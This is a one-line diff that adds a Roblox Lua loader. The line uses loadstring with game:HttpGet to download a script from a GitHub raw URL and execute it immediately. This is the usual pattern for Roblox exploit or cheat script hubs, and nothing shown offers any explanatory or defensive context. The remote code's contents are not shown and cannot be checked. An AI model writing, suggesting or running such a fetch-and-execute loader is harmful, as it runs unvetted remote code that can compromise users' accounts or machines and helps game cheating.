@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DevilishRa/ScriptPt2/main/ScriptPt2"))();
